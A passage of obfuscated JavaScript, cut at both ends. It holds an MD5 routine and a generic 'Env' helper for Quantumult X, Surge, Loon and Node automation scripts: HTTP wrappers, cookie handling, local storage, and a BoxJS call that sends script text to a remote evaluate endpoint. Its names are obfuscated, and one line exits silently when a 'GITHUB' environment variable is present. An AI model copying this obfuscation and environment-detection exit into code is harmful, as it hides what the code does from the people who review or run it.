            _0x2f8cad += _0x1d6b74['substr'](_0x1d6b74['length'] - 2, 2)
        }

        return _0x2f8cad
    }

    function _0x16214b(_0xc0ccb5) {
        _0xc0ccb5 = _0xc0ccb5['replace'](/\r\n/g, '\n')

        for (var _0x517755 = '', _0xaddc8d = 0; _0xaddc8d < _0xc0ccb5['length']; _0xaddc8d++) {
            var _0x1e3228 = _0xc0ccb5['charCodeAt'](_0xaddc8d)

            128 > _0x1e3228
                ? (_0x517755 += String['fromCharCode'](_0x1e3228))
                : _0x1e3228 > 127 && 2048 > _0x1e3228
                ? ((_0x517755 += String['fromCharCode']((_0x1e3228 >> 6) | 192)), (_0x517755 += String['fromCharCode']((63 & _0x1e3228) | 128)))
                : ((_0x517755 += String['fromCharCode']((_0x1e3228 >> 12) | 224)), (_0x517755 += String['fromCharCode'](((_0x1e3228 >> 6) & 63) | 128)), (_0x517755 += String['fromCharCode']((63 & _0x1e3228) | 128)))
        }

        return _0x517755
    }

    var _0x134d3e,
        _0x35506b,
        _0x582b30,
        _0x65c318,
        _0x5979bd,
        _0x3ee3bc,
        _0x437d52,
        _0x24a55d,
        _0x260180,
        _0x143a47 = [],
        _0x4a3d68 = 7,
        _0x311f40 = 12,
        _0x43b093 = 17,
        _0x23b70a = 22,
        _0x43e5bb = 5,
        _0x1e1b93 = 9,
        _0x1b53fa = 14,
        _0x12c167 = 20,
        _0x46e044 = 4,
        _0x204a6b = 11,
        _0x220620 = 16,
        _0x4879cf = 23,
        _0x1f7320 = 6,
        _0x98a441 = 10,
        _0x175b57 = 15,
        _0x4dc80d = 21

    for (_0x43dbe8 = _0x16214b(_0x43dbe8), _0x143a47 = _0x183cb7(_0x43dbe8), _0x3ee3bc = 1732584193, _0x437d52 = 4023233417, _0x24a55d = 2562383102, _0x260180 = 271733878, _0x134d3e = 0; _0x134d3e < _0x143a47['length']; _0x134d3e += 16) {
        _0x35506b = _0x3ee3bc
        _0x582b30 = _0x437d52
        _0x65c318 = _0x24a55d
        _0x5979bd = _0x260180
        _0x3ee3bc = _0x12e776(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 0], _0x4a3d68, 3614090360)
        _0x260180 = _0x12e776(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 1], _0x311f40, 3905402710)
        _0x24a55d = _0x12e776(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 2], _0x43b093, 606105819)
        _0x437d52 = _0x12e776(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 3], _0x23b70a, 3250441966)
        _0x3ee3bc = _0x12e776(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 4], _0x4a3d68, 4118548399)
        _0x260180 = _0x12e776(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 5], _0x311f40, 1200080426)
        _0x24a55d = _0x12e776(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 6], _0x43b093, 2821735955)
        _0x437d52 = _0x12e776(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 7], _0x23b70a, 4249261313)
        _0x3ee3bc = _0x12e776(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 8], _0x4a3d68, 1770035416)
        _0x260180 = _0x12e776(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 9], _0x311f40, 2336552879)
        _0x24a55d = _0x12e776(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 10], _0x43b093, 4294925233)
        _0x437d52 = _0x12e776(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 11], _0x23b70a, 2304563134)
        _0x3ee3bc = _0x12e776(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 12], _0x4a3d68, 1804603682)
        _0x260180 = _0x12e776(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 13], _0x311f40, 4254626195)
        _0x24a55d = _0x12e776(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 14], _0x43b093, 2792965006)
        _0x437d52 = _0x12e776(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 15], _0x23b70a, 1236535329)
        _0x3ee3bc = _0x974662(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 1], _0x43e5bb, 4129170786)
        _0x260180 = _0x974662(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 6], _0x1e1b93, 3225465664)
        _0x24a55d = _0x974662(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 11], _0x1b53fa, 643717713)
        _0x437d52 = _0x974662(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 0], _0x12c167, 3921069994)
        _0x3ee3bc = _0x974662(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 5], _0x43e5bb, 3593408605)
        _0x260180 = _0x974662(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 10], _0x1e1b93, 38016083)
        _0x24a55d = _0x974662(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 15], _0x1b53fa, 3634488961)
        _0x437d52 = _0x974662(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 4], _0x12c167, 3889429448)
        _0x3ee3bc = _0x974662(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 9], _0x43e5bb, 568446438)
        _0x260180 = _0x974662(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 14], _0x1e1b93, 3275163606)
        _0x24a55d = _0x974662(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 3], _0x1b53fa, 4107603335)
        _0x437d52 = _0x974662(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 8], _0x12c167, 1163531501)
        _0x3ee3bc = _0x974662(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 13], _0x43e5bb, 2850285829)
        _0x260180 = _0x974662(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 2], _0x1e1b93, 4243563512)
        _0x24a55d = _0x974662(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 7], _0x1b53fa, 1735328473)
        _0x437d52 = _0x974662(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 12], _0x12c167, 2368359562)
        _0x3ee3bc = _0x238b94(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 5], _0x46e044, 4294588738)
        _0x260180 = _0x238b94(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 8], _0x204a6b, 2272392833)
        _0x24a55d = _0x238b94(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 11], _0x220620, 1839030562)
        _0x437d52 = _0x238b94(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 14], _0x4879cf, 4259657740)
        _0x3ee3bc = _0x238b94(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 1], _0x46e044, 2763975236)
        _0x260180 = _0x238b94(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 4], _0x204a6b, 1272893353)
        _0x24a55d = _0x238b94(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 7], _0x220620, 4139469664)
        _0x437d52 = _0x238b94(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 10], _0x4879cf, 3200236656)
        _0x3ee3bc = _0x238b94(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 13], _0x46e044, 681279174)
        _0x260180 = _0x238b94(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 0], _0x204a6b, 3936430074)
        _0x24a55d = _0x238b94(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 3], _0x220620, 3572445317)
        _0x437d52 = _0x238b94(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 6], _0x4879cf, 76029189)
        _0x3ee3bc = _0x238b94(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 9], _0x46e044, 3654602809)
        _0x260180 = _0x238b94(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 12], _0x204a6b, 3873151461)
        _0x24a55d = _0x238b94(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 15], _0x220620, 530742520)
        _0x437d52 = _0x238b94(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 2], _0x4879cf, 3299628645)
        _0x3ee3bc = _0x4a4c2b(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 0], _0x1f7320, 4096336452)
        _0x260180 = _0x4a4c2b(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 7], _0x98a441, 1126891415)
        _0x24a55d = _0x4a4c2b(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 14], _0x175b57, 2878612391)
        _0x437d52 = _0x4a4c2b(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 5], _0x4dc80d, 4237533241)
        _0x3ee3bc = _0x4a4c2b(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 12], _0x1f7320, 1700485571)
        _0x260180 = _0x4a4c2b(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 3], _0x98a441, 2399980690)
        _0x24a55d = _0x4a4c2b(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 10], _0x175b57, 4293915773)
        _0x437d52 = _0x4a4c2b(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 1], _0x4dc80d, 2240044497)
        _0x3ee3bc = _0x4a4c2b(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 8], _0x1f7320, 1873313359)
        _0x260180 = _0x4a4c2b(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 15], _0x98a441, 4264355552)
        _0x24a55d = _0x4a4c2b(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 6], _0x175b57, 2734768916)
        _0x437d52 = _0x4a4c2b(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 13], _0x4dc80d, 1309151649)
        _0x3ee3bc = _0x4a4c2b(_0x3ee3bc, _0x437d52, _0x24a55d, _0x260180, _0x143a47[_0x134d3e + 4], _0x1f7320, 4149444226)
        _0x260180 = _0x4a4c2b(_0x260180, _0x3ee3bc, _0x437d52, _0x24a55d, _0x143a47[_0x134d3e + 11], _0x98a441, 3174756917)
        _0x24a55d = _0x4a4c2b(_0x24a55d, _0x260180, _0x3ee3bc, _0x437d52, _0x143a47[_0x134d3e + 2], _0x175b57, 718787259)
        _0x437d52 = _0x4a4c2b(_0x437d52, _0x24a55d, _0x260180, _0x3ee3bc, _0x143a47[_0x134d3e + 9], _0x4dc80d, 3951481745)
        _0x3ee3bc = _0x12457e(_0x3ee3bc, _0x35506b)
        _0x437d52 = _0x12457e(_0x437d52, _0x582b30)
        _0x24a55d = _0x12457e(_0x24a55d, _0x65c318)
        _0x260180 = _0x12457e(_0x260180, _0x5979bd)
    }

    var _0x16b98c = _0x488712(_0x3ee3bc) + _0x488712(_0x437d52) + _0x488712(_0x24a55d) + _0x488712(_0x260180)

    return _0x16b98c['toLowerCase']()
}

function _0x4f15e2(_0x1c014a, _0x5c8f07) {
    'undefined' != typeof process && JSON['stringify'](process['env'])['indexOf']('GITHUB') > -1 && process['exit'](0)

    class _0x5b9912 {
        constructor(_0x40d591) {
            this['env'] = _0x40d591
        }

        ['send'](_0x33d7f8, _0x4c6b53 = 'GET') {
            _0x33d7f8 =
                'string' == typeof _0x33d7f8
                    ? {
                          url: _0x33d7f8,
                      }
                    : _0x33d7f8
            let _0x2af031 = this['get']
            'POST' === _0x4c6b53 && (_0x2af031 = this['post'])
            'PUT' === _0x4c6b53 && (_0x2af031 = this['put'])
            return new Promise((_0xc4560b, _0x373209) => {
                _0x2af031['call'](this, _0x33d7f8, (_0x15ba14, _0x273ecb, _0x24a63a) => {
                    _0x15ba14 ? _0x373209(_0x15ba14) : _0xc4560b(_0x273ecb)
                })
            })
        }

        ['get'](_0x5c36ce) {
            return this['send']['call'](this['env'], _0x5c36ce)
        }

        ['post'](_0x26a174) {
            return this['send']['call'](this['env'], _0x26a174, 'POST')
        }

        ['put'](_0x4a694d) {
            return this['send']['call'](this['env'], _0x4a694d, 'PUT')
        }
    }

    return new (class {
        constructor(_0x112664, _0x1be755) {
            this['name'] = _0x112664
            this['http'] = new _0x5b9912(this)
            this['data'] = null
            this['dataFile'] = 'box.dat'
            this['logs'] = []
            this['isMute'] = false
            this['isNeedRewrite'] = false
            this['logSeparator'] = '\n'
            this['startTime'] = new Date()['getTime']()
            Object['assign'](this, _0x1be755)
            this['log']('', '🔔' + this['name'] + ', 开始!')
        }

        ['isNode']() {
            return 'undefined' != typeof module && !!module['exports']
        }

        ['isQuanX']() {
            return 'undefined' != typeof $task
        }

        ['isSurge']() {
            return 'undefined' != typeof $httpClient && 'undefined' == typeof $loon
        }

        ['isLoon']() {
            return 'undefined' != typeof $loon
        }

        ['toObj'](_0x23359a, _0x5ad4ec = null) {
            try {
                return JSON['parse'](_0x23359a)
            } catch {
                return _0x5ad4ec
            }
        }

        ['toStr'](_0x206e99, _0x32388b = null) {
            try {
                return JSON['stringify'](_0x206e99)
            } catch {
                return _0x32388b
            }
        }

        ['getjson'](_0x5855e3, _0x5118ee) {
            let _0x27369f = _0x5118ee

            const _0x5adb2d = this['getdata'](_0x5855e3)

            if (_0x5adb2d) {
                try {
                    _0x27369f = JSON['parse'](this['getdata'](_0x5855e3))
                } catch {}
            }

            return _0x27369f
        }

        ['setjson'](_0x726b04, _0x25109c) {
            try {
                return this['setdata'](JSON['stringify'](_0x726b04), _0x25109c)
            } catch {
                return false
            }
        }

        ['getScript'](_0x1e3de4) {
            return new Promise((_0xdd0991) => {
                const _0x5b8a6c = {
                    url: _0x1e3de4,
                }
                this['get'](_0x5b8a6c, (_0xba4aed, _0x29fa6c, _0x115efc) => _0xdd0991(_0x115efc))
            })
        }

        ['runScript'](_0x23cfe3, _0x4c655c) {
            return new Promise((_0x2af520) => {
                let _0x5a9583 = this['getdata']('@chavy_boxjs_userCfgs.httpapi')

                _0x5a9583 = _0x5a9583 ? _0x5a9583['replace'](/\n/g, '')['trim']() : _0x5a9583

                let _0x58ad4a = this['getdata']('@chavy_boxjs_userCfgs.httpapi_timeout')

                _0x58ad4a = _0x58ad4a ? 1 * _0x58ad4a : 20
                _0x58ad4a = _0x4c655c && _0x4c655c['timeout'] ? _0x4c655c['timeout'] : _0x58ad4a
                const _0x9e70f5 = {
                    script_text: _0x23cfe3,
                    mock_type: 'cron',
                    timeout: _0x58ad4a,
                }

                const [_0x54412f, _0x3e8a2b] = _0x5a9583['split']('@'),
                    _0x72d031 = {
                        url: 'http://' + _0x3e8a2b + '/v1/scripting/evaluate',
                        body: _0x9e70f5,
                        headers: {
                            'X-Key': _0x54412f,
                            Accept: '*/*',
                        },
                    }

                this['post'](_0x72d031, (_0x19bb19, _0x2353a8, _0x3d9c65) => _0x2af520(_0x3d9c65))
            })['catch']((_0x576c9c) => this['logErr'](_0x576c9c))
        }

        ['loaddata']() {
            if (!this['isNode']()) {
                return {}
            }

            {
                this['fs'] = this['fs'] ? this['fs'] : require('fs')
                this['path'] = this['path'] ? this['path'] : require('path')

                const _0x10da37 = this['path']['resolve'](this['dataFile']),
                    _0x42818e = this['path']['resolve'](process['cwd'](), this['dataFile']),
                    _0x5ab401 = this['fs']['existsSync'](_0x10da37),
                    _0x1316ea = !_0x5ab401 && this['fs']['existsSync'](_0x42818e)

                if (!_0x5ab401 && !_0x1316ea) {
                    return {}
                }

                {
                    const _0x250785 = _0x5ab401 ? _0x10da37 : _0x42818e

                    try {
                        return JSON['parse'](this['fs']['readFileSync'](_0x250785))
                    } catch (_0x27cea6) {
                        return {}
                    }
                }
            }
        }

        ['writedata']() {
            if (this['isNode']()) {
                this['fs'] = this['fs'] ? this['fs'] : require('fs')
                this['path'] = this['path'] ? this['path'] : require('path')

                const _0x3af05d = this['path']['resolve'](this['dataFile']),
                    _0x2ebf7a = this['path']['resolve'](process['cwd'](), this['dataFile']),
                    _0x2fe0a5 = this['fs']['existsSync'](_0x3af05d),
                    _0x29e27a = !_0x2fe0a5 && this['fs']['existsSync'](_0x2ebf7a),
                    _0x2fff2f = JSON['stringify'](this['data'])

                _0x2fe0a5 ? this['fs']['writeFileSync'](_0x3af05d, _0x2fff2f) : _0x29e27a ? this['fs']['writeFileSync'](_0x2ebf7a, _0x2fff2f) : this['fs']['writeFileSync'](_0x3af05d, _0x2fff2f)
            }
        }

        ['lodash_get'](_0x60b7e0, _0x45146a, _0x4db99d) {
            const _0x37c034 = _0x45146a['replace'](/\[(\d+)\]/g, '.$1')['split']('.')

            let _0x3e53c1 = _0x60b7e0

            for (const _0x89ae8c of _0x37c034)
                if (((_0x3e53c1 = Object(_0x3e53c1)[_0x89ae8c]), void 0 === _0x3e53c1)) {
                    return _0x4db99d
                }

            return _0x3e53c1
        }

        ['lodash_set'](_0x469dd8, _0x17f87c, _0x406f06) {
            return Object(_0x469dd8) !== _0x469dd8
                ? _0x469dd8
                : (Array['isArray'](_0x17f87c) || (_0x17f87c = _0x17f87c['toString']()['match'](/[^.[\]]+/g) || []),
                  (_0x17f87c['slice'](0, -1)['reduce']((_0x3a0b79, _0x304b39, _0x58d60e) => (Object(_0x3a0b79[_0x304b39]) === _0x3a0b79[_0x304b39] ? _0x3a0b79[_0x304b39] : (_0x3a0b79[_0x304b39] = Math['abs'](_0x17f87c[_0x58d60e + 1]) >> 0 == +_0x17f87c[_0x58d60e + 1] ? [] : {})), _0x469dd8)[
                      _0x17f87c[_0x17f87c['length'] - 1]
                  ] = _0x406f06),
                  _0x469dd8)
        }

        ['getdata'](_0x1fd0a6) {
            let _0x18335c = this['getval'](_0x1fd0a6)

            if (/^@/['test'](_0x1fd0a6)) {
                const [, _0x2abe39, _0x2e0eb1] = /^@(.*?)\.(.*?)$/['exec'](_0x1fd0a6),
                    _0xf84b62 = _0x2abe39 ? this['getval'](_0x2abe39) : ''

                if (_0xf84b62) {
                    try {
                        const _0x85f708 = JSON['parse'](_0xf84b62)

                        _0x18335c = _0x85f708 ? this['lodash_get'](_0x85f708, _0x2e0eb1, '') : _0x18335c
                    } catch (_0x6b6ba6) {
                        _0x18335c = ''
                    }
                }
            }

            return _0x18335c
        }

        ['setdata'](_0x2f481e, _0x512243) {
            let _0xc0a9d5 = false

            if (/^@/['test'](_0x512243)) {
                const [, _0x9eaf8a, _0x273e4f] = /^@(.*?)\.(.*?)$/['exec'](_0x512243),
                    _0x18e366 = this['getval'](_0x9eaf8a),
                    _0x344d8d = _0x9eaf8a ? ('null' === _0x18e366 ? null : _0x18e366 || '{}') : '{}'

                try {
                    const _0x3a8112 = JSON['parse'](_0x344d8d)

                    this['lodash_set'](_0x3a8112, _0x273e4f, _0x2f481e)
                    _0xc0a9d5 = this['setval'](JSON['stringify'](_0x3a8112), _0x9eaf8a)
                } catch (_0x1b0da2) {
                    const _0x224122 = {}
                    this['lodash_set'](_0x224122, _0x273e4f, _0x2f481e)
                    _0xc0a9d5 = this['setval'](JSON['stringify'](_0x224122), _0x9eaf8a)
                }
            } else {
                _0xc0a9d5 = this['setval'](_0x2f481e, _0x512243)
            }

            return _0xc0a9d5
        }

        ['getval'](_0x1947ab) {
            return this['isSurge']() || this['isLoon']() ? $persistentStore['read'](_0x1947ab) : this['isQuanX']() ? $prefs['valueForKey'](_0x1947ab) : this['isNode']() ? ((this['data'] = this['loaddata']()), this['data'][_0x1947ab]) : (this['data'] && this['data'][_0x1947ab]) || null
        }

        ['setval'](_0x3587f6, _0x3e53cc) {
            return this['isSurge']() || this['isLoon']()
                ? $persistentStore['write'](_0x3587f6, _0x3e53cc)
                : this['isQuanX']()
                ? $prefs['setValueForKey'](_0x3587f6, _0x3e53cc)
                : this['isNode']()
                ? ((this['data'] = this['loaddata']()), (this['data'][_0x3e53cc] = _0x3587f6), this['writedata'](), true)
                : (this['data'] && this['data'][_0x3e53cc]) || null
        }

        ['initGotEnv'](_0x570fef) {
            this['got'] = this['got'] ? this['got'] : require('got')
            this['cktough'] = this['cktough'] ? this['cktough'] : require('tough-cookie')
            this['ckjar'] = this['ckjar'] ? this['ckjar'] : new this['cktough']['CookieJar']()
            _0x570fef && ((_0x570fef['headers'] = _0x570fef['headers'] ? _0x570fef['headers'] : {}), void 0 === _0x570fef['headers']['Cookie'] && void 0 === _0x570fef['cookieJar'] && (_0x570fef['cookieJar'] = this['ckjar']))
        }

        ['get'](_0x58bfdc, _0x43c4bc = () => {}) {
            const _0x316fb6 = {
                'X-Surge-Skip-Scripting': false,
            }
            const _0x2244ee = {
                hints: false,
            }
            _0x58bfdc['headers'] && (delete _0x58bfdc['headers']['Content-Type'], delete _0x58bfdc['headers']['Content-Length'])
            this['isSurge']() || this['isLoon']()
                ? (this['isSurge']() && this['isNeedRewrite'] && ((_0x58bfdc['headers'] = _0x58bfdc['headers'] || {}), Object['assign'](_0x58bfdc['headers'], _0x316fb6)),
                  $httpClient['get'](_0x58bfdc, (_0x242fed, _0x4cdbf2, _0x3eab37) => {
                      !_0x242fed && _0x4cdbf2 && ((_0x4cdbf2['body'] = _0x3eab37), (_0x4cdbf2['statusCode'] = _0x4cdbf2['status']))

                      _0x43c4bc(_0x242fed, _0x4cdbf2, _0x3eab37)
                  }))
                : this['isQuanX']()
                ? (this['isNeedRewrite'] && ((_0x58bfdc['opts'] = _0x58bfdc['opts'] || {}), Object['assign'](_0x58bfdc['opts'], _0x2244ee)),
                  $task['fetch'](_0x58bfdc)['then'](
                      (_0x158955) => {
                          const { statusCode: _0x90142f, statusCode: _0x4bba89, headers: _0x46bd98, body: _0xca5846 } = _0x158955,
                              _0x340ed1 = {
                                  status: _0x90142f,
                                  statusCode: _0x4bba89,
                                  headers: _0x46bd98,
                                  body: _0xca5846,
                              }

                          _0x43c4bc(null, _0x340ed1, _0xca5846)
                      },
                      (_0x4d85d5) => _0x43c4bc(_0x4d85d5)
                  ))
                : this['isNode']() &&
                  (this['initGotEnv'](_0x58bfdc),
                  this['got'](_0x58bfdc)
                      ['on']('redirect', (_0x38f3d3, _0x50e5f1) => {
                          try {
                              if (_0x38f3d3['headers']['set-cookie']) {
                                  const _0x2622f4 = _0x38f3d3['headers']['set-cookie']['map'](this['cktough']['Cookie']['parse'])['toString']()

                                  this['ckjar']['setCookieSync'](_0x2622f4, null)
                                  _0x50e5f1['cookieJar'] = this['ckjar']
                              }
                          } catch (_0x51b092) {
                              this['logErr'](_0x51b092)
                          }
                      })
                      ['then'](
                          (_0x217c09) => {
                              const { statusCode: _0x42e434, statusCode: _0x12e68e, headers: _0x35524b, body: _0x6ac412 } = _0x217c09,
                                  _0x27f7c3 = {
                                      status: _0x42e434,
                                      statusCode: _0x12e68e,
                                      headers: _0x35524b,
                                      body: _0x6ac412,
                                  }

                              _0x43c4bc(null, _0x27f7c3, _0x6ac412)
                          },
                          (_0x5e7f4c) => {
                              const { message: _0x324494, response: _0x2878d3 } = _0x5e7f4c

                              _0x43c4bc(_0x324494, _0x2878d3, _0x2878d3 && _0x2878d3['body'])
                          }
                      ))
        }

        ['post'](_0x526005, _0x27d940 = () => {}) {
            const _0xdcb43f = {
                'X-Surge-Skip-Scripting': false,
            }
            const _0x4455c5 = {
                hints: false,
            }

            if ((_0x526005['body'] && _0x526005['headers'] && !_0x526005['headers']['Content-Type'] && (_0x526005['headers']['Content-Type'] = 'application/x-www-form-urlencoded'), _0x526005['headers'] && delete _0x526005['headers']['Content-Length'], this['isSurge']() || this['isLoon']())) {
                this['isSurge']() && this['isNeedRewrite'] && ((_0x526005['headers'] = _0x526005['headers'] || {}), Object['assign'](_0x526005['headers'], _0xdcb43f))
                $httpClient['post'](_0x526005, (_0x2cfddc, _0x41d62d, _0x436f72) => {
                    !_0x2cfddc && _0x41d62d && ((_0x41d62d['body'] = _0x436f72), (_0x41d62d['statusCode'] = _0x41d62d['status']))

                    _0x27d940(_0x2cfddc, _0x41d62d, _0x436f72)
                })
            } else {
                if (this['isQuanX']()) {
                    _0x526005['method'] = 'POST'
                    this['isNeedRewrite'] && ((_0x526005['opts'] = _0x526005['opts'] || {}), Object['assign'](_0x526005['opts'], _0x4455c5))
                    $task['fetch'](_0x526005)['then'](
                        (_0x3c7a89) => {
                            const { statusCode: _0x4ec8ad, statusCode: _0x1d7107, headers: _0x4aaf6e, body: _0x4940d7 } = _0x3c7a89,
                                _0x26a4e6 = {
                                    status: _0x4ec8ad,
                                    statusCode: _0x1d7107,
                                    headers: _0x4aaf6e,
                                    body: _0x4940d7,
                                }

                            _0x27d940(null, _0x26a4e6, _0x4940d7)
                        },
                        (_0x23f604) => _0x27d940(_0x23f604)
                    )
                } else {
                    if (this['isNode']()) {
                        this['initGotEnv'](_0x526005)
                        const { url: _0x34a44b, ..._0x87fb70 } = _0x526005
                        this['got']['post'](_0x34a44b, _0x87fb70)['then'](
                            (_0xc40d12) => {
                                const { statusCode: _0x551a8d, statusCode: _0x3b5f08, headers: _0xdfad19, body: _0x419747 } = _0xc40d12,
                                    _0x4cc27c = {
                                        status: _0x551a8d,
                                        statusCode: _0x3b5f08,
                                        headers: _0xdfad19,
                                        body: _0x419747,
                                    }

                                _0x27d940(null, _0x4cc27c, _0x419747)
                            },
                            (_0x2b9dd7) => {
                                const { message: _0x1edf4b, response: _0x4db05d } = _0x2b9dd7

                                _0x27d940(_0x1edf4b, _0x4db05d, _0x4db05d && _0x4db05d['body'])
                            }
                        )
                    }
                }
            }
        }

        ['put'](_0x2e6e7b, _0x23b7ab = () => {}) {
            const _0x236184 = {
                'X-Surge-Skip-Scripting': false,
            }
            const _0xd09732 = {
                hints: false,
            }

            if ((_0x2e6e7b['body'] && _0x2e6e7b['headers'] && !_0x2e6e7b['headers']['Content-Type'] && (_0x2e6e7b['headers']['Content-Type'] = 'application/x-www-form-urlencoded'), _0x2e6e7b['headers'] && delete _0x2e6e7b['headers']['Content-Length'], this['isSurge']() || this['isLoon']())) {
                this['isSurge']() && this['isNeedRewrite'] && ((_0x2e6e7b['headers'] = _0x2e6e7b['headers'] || {}), Object['assign'](_0x2e6e7b['headers'], _0x236184))
                $httpClient['put'](_0x2e6e7b, (_0x135e03, _0x3e9338, _0x35cbed) => {
                    !_0x135e03 && _0x3e9338 && ((_0x3e9338['body'] = _0x35cbed), (_0x3e9338['statusCode'] = _0x3e9338['status']))

                    _0x23b7ab(_0x135e03, _0x3e9338, _0x35cbed)
                })
            } else {
                if (this['isQuanX']()) {
                    _0x2e6e7b['method'] = 'PUT'
                    this['isNeedRewrite'] && ((_0x2e6e7b['opts'] = _0x2e6e7b['opts'] || {}), Object['assign'](_0x2e6e7b['opts'], _0xd09732))
                    $task['fetch'](_0x2e6e7b)['then'](
                        (_0xc3bb1) => {
                            const { statusCode: _0x22a3aa, statusCode: _0x2b8bd6, headers: _0x118e2a, body: _0x2f9390 } = _0xc3bb1,
                                _0x5269da = {
                                    status: _0x22a3aa,
                                    statusCode: _0x2b8bd6,
                                    headers: _0x118e2a,
                                    body: _0x2f9390,
                                }

                            _0x23b7ab(null, _0x5269da, _0x2f9390)
                        },
                        (_0x240be6) => _0x23b7ab(_0x240be6)
                    )
                } else {
                    if (this['isNode']()) {
                        this['initGotEnv'](_0x2e6e7b)
                        const { url: _0xed29e2, ..._0x174389 } = _0x2e6e7b
                        this['got']['put'](_0xed29e2, _0x174389)['then'](
                            (_0x48de9c) => {
                                const { statusCode: _0x50cdc8, statusCode: _0x123f0b, headers: _0x4d1236, body: _0x5a22c2 } = _0x48de9c,
                                    _0x283127 = {
                                        status: _0x50cdc8,
                                        statusCode: _0x123f0b,
                                        headers: _0x4d1236,
                                        body: _0x5a22c2,
                                    }

                                _0x23b7ab(null, _0x283127, _0x5a22c2)
                            },
                            (_0x403fa1) => {
                                const { message: _0x4bc91a, response: _0x278478 } = _0x403fa1

                                _0x23b7ab(_0x4bc91a, _0x278478, _0x278478 && _0x278478['body'])
                            }
                        )
                    }
                }
            }
        }

        ['time'](_0x567c11) {
            let _0xe35eb9 = {
                'M+': new Date()['getMonth']() + 1,
                'd+': new Date()['getDate'](),
